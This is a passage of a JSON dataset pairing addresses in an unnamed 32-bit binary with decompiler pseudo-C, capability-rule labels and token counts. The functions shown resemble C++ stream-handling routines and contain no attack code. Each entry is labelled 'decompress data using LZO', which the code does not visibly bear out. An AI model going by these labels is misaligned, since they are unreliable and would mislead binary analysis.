        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00466690(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.0049c4a0(arg_ch);\n    iVar1 = arg_8h[3];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[4];\n    fcn.0049c4a0(arg_ch);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[5];\n    in_ECX[2] = arg_8h[6];\n    return;\n}\n",
        "token_count": 247
    },
    "00466720": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.00466720(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_8h;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.0049c4a0(0);\n    iVar1 = arg_8h[3];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[4];\n    fcn.0049c4a0(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[5];\n    in_ECX[2] = arg_8h[6];\n    return;\n}\n",
        "token_count": 247
    },
    "00466900": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n// WARNING: Variable defined which should be unmapped: var_ch_2\n// WARNING: Removing unreachable block (ram,0x004673b0)\n// WARNING: Removing unreachable block (ram,0x00467290)\n// WARNING: Removing unreachable block (ram,0x00467170)\n// WARNING: Removing unreachable block (ram,0x00467050)\n// WARNING: Removing unreachable block (ram,0x00466f30)\n// WARNING: Removing unreachable block (ram,0x00466e10)\n// WARNING: Removing unreachable block (ram,0x00466cf0)\n// WARNING: Removing unreachable block (ram,0x00466bd0)\n// WARNING: Removing unreachable block (ram,0x00466ab0)\n// WARNING: Removing unreachable block (ram,0x00466990)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __fastcall fcn.00466900(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    int32_t *extraout_ECX_02;\n    int32_t *extraout_ECX_03;\n    int32_t *extraout_ECX_04;\n    int32_t *extraout_ECX_05;\n    int32_t *extraout_ECX_06;\n    int32_t *extraout_ECX_07;\n    int32_t *extraout_ECX_08;\n    int32_t *extraout_ECX_09;\n    int32_t *extraout_ECX_10;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    int32_t extraout_EDX_03;\n    int32_t extraout_EDX_04;\n    int32_t extraout_EDX_05;\n    int32_t extraout_EDX_06;\n    int32_t extraout_EDX_07;\n    int32_t extraout_EDX_08;\n    uint8_t *puVar8;\n    int32_t iVar9;\n    uchar *puVar10;\n    ulong uVar11;\n    uint var_1dh;\n    uint var_ch;\n    char cStack989;\n    uint var_1ch_12;\n    int32_t in_stack_fffffc48;\n    uchar *in_stack_fffffc4c;\n    uint32_t var_ch_12;\n    uint var_bp_8h;\n    char cStack873;\n    uint32_t uStack872;\n    uint uStack856;\n    int32_t iStack852;\n    uint var_1dh_11;\n    uint var_ch_11;\n    uint var_1dh_10;\n    uint var_ch_10;\n    uint var_1dh_9;\n    uint var_ch_9;\n    uint var_1dh_8;\n    uint var_ch_8;\n    uint var_1dh_7;\n    uint var_ch_7;\n    uint var_1dh_6;\n    uint var_ch_6;\n    uint var_1dh_5;\n    uint var_ch_5;\n    uint var_1dh_4;\n    uint var_ch_4;\n    uint var_1dh_3;\n    uint var_ch_3;\n    uint var_1dh_2;\n    uint var_ch_2;\n    \n    fcn.00468920();\n    if (var_1dh_2 == '\\0') {\n        return param_1;\n    }\n    piVar5 = *(param_1 + *(*param_1 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x30))();\n        return param_1;\n    }\n    fcn.0049e780();\n    if (extraout_EDX == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*param_1 + -0xc);\n        puVar1 = param_1 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_1 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*param_1 + -0xc);\n        puVar1 = param_1 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_1 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return param_1;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.00468920();\n    if (var_1dh_3 == '\\0') {\n        return extraout_ECX;\n    }\n    piVar5 = *(extraout_ECX + *(*extraout_ECX + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 8))();\n        return extraout_ECX;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_00 == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.00468920();\n    if (var_1dh_4 == '\\0') {\n        return extraout_ECX_00;\n    }\n    piVar5 = *(extraout_ECX_00 + *(*extraout_ECX_00 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x28))();\n        return extraout_ECX_00;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_01 == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX_00;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.00468920();\n    if (var_1dh_5 == '\\0') {\n        return extraout_ECX_01;\n    }\n    piVar5 = *(extraout_ECX_01 + *(*extraout_ECX_01 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x2c))();\n        return extraout_ECX_01;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_02 == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_01 + -0xc);\n        puVar1 = extraout_ECX_01 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_01 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_01 + -0xc);\n        puVar1 = extraout_ECX_01 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_01 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX_01;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.00468920();\n    if (var_1dh_6 == '\\0') {\n        return extraout_ECX_02;\n    }\n    piVar5 = *(extraout_ECX_02 + *(*extraout_ECX_02 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x24))();\n        return extraout_ECX_02;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_03 == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_02 + -0xc);\n        puVar1 = extraout_ECX_02 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_02 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_02 + -0xc);\n        puVar1 = extraout_ECX_02 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_02 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX_02;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.00468920();\n    if (var_1dh_7 == '\\0') {\n        return extraout_ECX_03;\n    }\n    piVar5 = *(extraout_ECX_03 + *(*extraout_ECX_03 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x14))();\n        return extraout_ECX_03;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_04 == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX_03;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.00468920();\n    if (var_1dh_8 == '\\0') {\n        return extraout_ECX_04;\n    }\n    piVar5 = *(extraout_ECX_04 + *(*extraout_ECX_04 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0xc))();\n        return extraout_ECX_04;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_05 == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_04 + -0xc);\n        puVar1 = extraout_ECX_04 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_04 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_04 + -0xc);\n        puVar1 = extraout_ECX_04 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_04 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX_04;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.00468920();\n    if (var_1dh_9 == '\\0') {\n        return extraout_ECX_05;\n    }\n    piVar5 = *(extraout_ECX_05 + *(*extraout_ECX_05 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x18))();\n        return extraout_ECX_05;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_06 == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_05 + -0xc);\n        puVar1 = extraout_ECX_05 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_05 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_05 + -0xc);\n        puVar1 = extraout_ECX_05 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_05 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX_05;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.00468920();\n    if (var_1dh_10 == '\\0') {\n        return extraout_ECX_06;\n    }\n    piVar5 = *(extraout_ECX_06 + *(*extraout_ECX_06 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x10))();\n        return extraout_ECX_06;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_07 == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_06 + -0xc);\n        puVar1 = extraout_ECX_06 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_06 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_06 + -0xc);\n        puVar1 = extraout_ECX_06 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_06 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX_06;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.00468920();\n    if (var_1dh_11 == '\\0') {\n        return extraout_ECX_07;\n    }\n    iStack852 = *(*extraout_ECX_07 + -0xc) + extraout_ECX_07;\n    if (*(iStack852 + 0x84) != NULL) {\n        (**(**(iStack852 + 0x84) + 0x1c))();\n        return extraout_ECX_07;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_08 == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_07 + -0xc);\n        puVar1 = extraout_ECX_07 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_07 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_07 + -0xc);\n        puVar1 = extraout_ECX_07 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_07 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX_07;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    uStack856 = fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    piVar5 = extraout_ECX_08;\n    fcn.00468920(extraout_ECX_08, 0);\n    if (cStack873 == '\\0') {\n        return extraout_ECX_08;\n    }\n    uStack872 = 0;\n    iVar9 = *(*extraout_ECX_08 + -0xc) + extraout_ECX_08;\n    if (*(iVar9 + 0x84) != NULL) {\n        (**(**(iVar9 + 0x84) + 0x20))(*(iVar9 + 0x78), 0xffffffff, 0, 0xffffffff, iVar9, &stack0xfffffc98, 0x46733e);\ncode_r0x004674b9:\n        if (uStack872 == 0) {\n            return extraout_ECX_08;\n        }\n        fcn.0049c600(uStack872 | *(extraout_ECX_08 + *(*extraout_ECX_08 + -0xc) + 0x14));\n        return extraout_ECX_08;\n    }\n    uVar11 = fcn.0049e780();\n    if (uVar11 >> 0x20 == 1) {\n        fcn.004a36d0(uVar11);\n        iVar9 = *(*extraout_ECX_08 + -0xc);\n        puVar1 = extraout_ECX_08 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_08 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        piVar3 = fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0(uVar11);\n        iVar9 = *(*extraout_ECX_08 + -0xc);\n        puVar1 = extraout_ECX_08 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_08 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            goto code_r0x004674b9;\n        }\n        fcn.004a3b60();\n        piVar3 = extraout_ECX_08;\n    }\n    fcn.004a3840();\n    uVar4 = fcn.0041b360(piVar3);\n    fcn.004a3840();\n    fcn.0041b360(uVar4);\n    piVar3 = *(extraout_ECX_09 + *(*extraout_ECX_09 + -0xc) + 0x7c);\n    if (piVar3 != NULL) {\n        if (*(piVar3 + 7) == '\\0') {\n            fcn.00431cc0();\n            iVar9 = 10;\n            if (*(*piVar3 + 0x18) != 0x431f70) {\n                cVar2 = (**(*piVar3 + 0x18))(10);\n                iVar9 = cVar2;\n            }\n        }\n        else {\n            iVar9 = *(piVar3 + 0x27);\n        }\n        piVar5 = fcn.004675e0(0x46745e, piVar5, iVar9);\n        return piVar5;\n    }\n    fcn.0049e780();\n    extraout_ECX_10[1] = 0;\n    fcn.00468920(extraout_ECX_10, 1);\n    if (cStack989 == '\\0') {\n        if (0 < in_stack_fffffc48) {\n            *in_stack_fffffc4c = 0;\n            iVar9 = extraout_ECX_10[1];\n            goto joined_r0x004676a0;\n        }\n        iVar9 = extraout_ECX_10[1];\ncode_r0x00467746:\n        if (iVar9 != 0) {\n            return extraout_ECX_10;\n        }\n    }\n    else {\n        piVar5 = *(extraout_ECX_10 + *(*extraout_ECX_10 + -0xc) + 0x78);\n        puVar7 = piVar5[2];\n        if (puVar7 <= piVar5[3] && piVar5[3] != puVar7) goto code_r0x004676ae;\ncode_r0x00467670:\n        uVar6 = (**(*piVar5 + 0x24))();\n        iVar9 = extraout_ECX_10[1];\n        puVar10 = in_stack_fffffc4c;\n        if (iVar9 + 1 < in_stack_fffffc48) {\n            do {\n                in_stack_fffffc4c = puVar10;\n                if (uVar6 == 0xffffffff) {\ncode_r0x004676ee:\n                    uVar6 = 2;\n                    puVar10 = in_stack_fffffc4c;\ncode_r0x004676f3:\n                    if (0 < in_stack_fffffc48) {\n                        *puVar10 = 0;\n                    }\n                    if (extraout_ECX_10[1] == 0) {\n                        uVar6 = uVar6 | 4;\n                    }\n                    else if (uVar6 == 0) {\n                        return extraout_ECX_10;\n                    }\n                    goto code_r0x00467631;\n                }\n                if ((var_ch_12 & 0xff) == uVar6) {\n                    uVar6 = 0;\n                    goto code_r0x004676f3;\n                }\n                in_stack_fffffc4c = puVar10 + 1;\n                *puVar10 = uVar6;\n                puVar7 = piVar5[2];\n                puVar8 = piVar5[3];\n                extraout_ECX_10[1] = extraout_ECX_10[1] + 1;\n                if (puVar7 < puVar8) {\n                    puVar7 = puVar7 + 1;\n                    piVar5[2] = puVar7;\n                }\n                else {\n                    iVar9 = (**(*piVar5 + 0x28))();\n                    if (iVar9 == -1) goto code_r0x004676ee;\n                    puVar7 = piVar5[2];\n                    puVar8 = piVar5[3];\n                }\n                if (puVar8 <= puVar7) goto code_r0x00467670;\ncode_r0x004676ae:\n                iVar9 = extraout_ECX_10[1];\n                uVar6 = *puVar7;\n                puVar10 = in_stack_fffffc4c;\n                if (in_stack_fffffc48 <= iVar9 + 1) break;\n            } while( true );\n        }\n        if (uVar6 == 0xffffffff) {\n            if (0 < in_stack_fffffc48) {\n                *in_stack_fffffc4c = 0;\n                iVar9 = extraout_ECX_10[1];\n            }\n            if (iVar9 == 0) {\n                uVar6 = 6;\n            }\n            else {\n                uVar6 = 2;\n            }\n            goto code_r0x00467631;\n        }\n        if (in_stack_fffffc48 < 1) goto code_r0x00467746;\n        *in_stack_fffffc4c = 0;\n        iVar9 = extraout_ECX_10[1];\njoined_r0x004676a0:\n        if (iVar9 != 0) {\n            return extraout_ECX_10;\n        }\n    }\n    uVar6 = 4;\ncode_r0x00467631:\n    fcn.0049c600(uVar6 | *(extraout_ECX_10 + *(*extraout_ECX_10 + -0xc) + 0x14));\n    return extraout_ECX_10;\n}\n",
        "token_count": 6421
    },
    "00467880": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00467880(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    uint var_2ch;\n    uint var_19h;\n    uint var_ch;\n    \n    in_ECX[1] = 0;\n    fcn.00468920();\n    if (var_19h != '\\0') {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        puVar3 = piVar1[2];\n        if (piVar1[3] < puVar3 || piVar1[3] == puVar3) goto code_r0x00467940;\n        uVar2 = *puVar3;\n        uVar6 = uVar2;\ncode_r0x004678d4:\n        if ((arg_ch & 0xff) != uVar2) {\n            do {\n                if (arg_8h[5] < arg_8h[6]) {\n                    *arg_8h[5] = uVar6;\n                    arg_8h[5] = arg_8h[5] + 1;\n                    puVar3 = piVar1[2];\n                    puVar5 = piVar1[3];\n                    in_ECX[1] = in_ECX[1] + 1;\n                    if (puVar5 <= puVar3) goto code_r0x00467984;\ncode_r0x004678f9:\n                    puVar3 = puVar3 + 1;\n                    piVar1[2] = puVar3;\n                }\n                else {\n                    iVar4 = (**(*arg_8h + 0x34))(uVar6);\n                    if (iVar4 == -1) break;\n                    puVar3 = piVar1[2];\n                    puVar5 = piVar1[3];\n                    in_ECX[1] = in_ECX[1] + 1;\n                    if (puVar3 < puVar5) goto code_r0x004678f9;\ncode_r0x00467984:\n                    iVar4 = (**(*piVar1 + 0x28))();\n                    if (iVar4 == -1) goto code_r0x00467950;\n                    puVar3 = piVar1[2];\n                    puVar5 = piVar1[3];\n                }\n                if (puVar5 <= puVar3) goto code_r0x00467940;\n                uVar6 = *puVar3;\n                if ((arg_ch & 0xff) == uVar6) break;\n            } while( true );\n        }\n    }\n    if (in_ECX[1] != 0) {\n        return;\n    }\n    uVar6 = 4;\ncode_r0x0046791c:\n    fcn.0049c600(uVar6 | *(in_ECX + *(*in_ECX + -0xc) + 0x14));\n    return;\ncode_r0x00467940:\n    uVar2 = (**(*piVar1 + 0x24))();\n    uVar6 = uVar2 & 0xff;\n    if (uVar2 == 0xffffffff) goto code_r0x00467950;\n    goto code_r0x004678d4;\ncode_r0x00467950:\n    uVar6 = (-(in_ECX[1] == 0) & 4) + 2;\n    goto code_r0x0046791c;\n}\n",
        "token_count": 828
    },
    "00467d30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00467d30(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    in_ECX[1] = 0;\n    fcn.00468920();\n    if (var_9h != '\\0') {\n        iVar1 = (**(**(in_ECX + *(*in_ECX + -0xc) + 0x78) + 0x20))(arg_8h, arg_ch);\n        in_ECX[1] = iVar1;\n        if (arg_ch != iVar1) {\n            fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 6);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 218
    },
    "00467f90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00467f90(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_39h;\n    uint32_t var_34h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 0xfffffffd);\n    fcn.00468920();\n    if ((var_39h != '\\0') && ((*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 5) == 0)) {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        (**(*piVar1 + 0x14))(piVar1, arg_8h, arg_ch, arg_10h, arg_14h, 8);\n        if ((var_34h & stack0xffffffc4) == 0xffffffff) {\n            fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 362
    },
    "004680e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004680e0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint32_t var_29h;\n    uint32_t var_24h;\n    uint var_ch;\n    \n    fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 0xfffffffd);\n    fcn.00468920();\n    if ((var_29h != '\\0') && ((*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 5) == 0)) {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        (**(*piVar1 + 0x10))(piVar1, arg_8h, arg_ch, arg_10h, 8);\n        if ((var_24h & stack0xffffffd4) == 0xffffffff) {\n            fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 295
    },
    "00468300": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __fastcall fcn.00468300(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    param_1[1] = 0;\n    fcn.0049c600(*(param_1 + *(*param_1 + -0xc) + 0x14) & 0xfffffffd);\n    fcn.00468920(param_1, 1);\n    if (var_9h != '\\0') {\n        iVar2 = *(*param_1 + -0xc) + param_1;\n        piVar1 = *(iVar2 + 0x78);\n        if (piVar1 == NULL) {\ncode_r0x00468382:\n            fcn.0049c600(*(iVar2 + 0x14) | 1);\n            return param_1;\n        }\n        if (piVar1[1] < piVar1[2]) {\n            piVar1[2] = piVar1[2] - 1;\n        }\n        else {\n            iVar2 = (**(*piVar1 + 0x2c))(0xffffffff);\n            if (iVar2 == -1) {\n                iVar2 = *(*param_1 + -0xc) + param_1;\n                goto code_r0x00468382;\n            }\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 341
    },
    "00468920": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00468d53: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00468d58)\n\nint32_t * __thiscall fcn.00468920(uchar *param_1, int32_t *param_2, int32_t *param_3)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    uint8_t uVar3;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uchar *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    uint8_t *puVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    ulong uVar13;\n    uint8_t *puStack184;\n    char cStack153;\n    uchar *puStack120;\n    int32_t in_stack_ffffff8c;\n    uint8_t uStack104;\n    int32_t *piStack40;\n    int32_t *piStack36;\n    \n    *param_1 = 0;\n    iVar5 = *param_2;\n    iVar9 = *(iVar5 + -0xc) + param_2;\n    piVar6 = *(iVar9 + 0x14);\n    if (*(iVar9 + 0x14) != NULL) goto code_r0x004689e5;\n    if (*(iVar9 + 0x70) == 0) {\n        if ((param_3 != '\\0') || ((*(iVar9 + 0xd) & 0x10) == 0)) goto code_r0x00468a10;\ncode_r0x00468973:\n        piVar6 = *(iVar9 + 0x78);\n        puVar10 = piVar6[2];\n        if (piVar6[3] < puVar10 || piVar6[3] == puVar10) {\n            iVar12 = (**(*piVar6 + 0x24))();\n            iVar5 = *param_2;\n            iVar11 = *(iVar5 + -0xc) + param_2;\n            iVar9 = *(iVar11 + 0x7c);\n            if (iVar9 == 0) goto code_r0x00468a1d;\n            if (iVar12 == -1) {\ncode_r0x004689df:\n                piVar6 = *(iVar11 + 0x14) | 2;\n                goto code_r0x004689e5;\n            }\n            uVar3 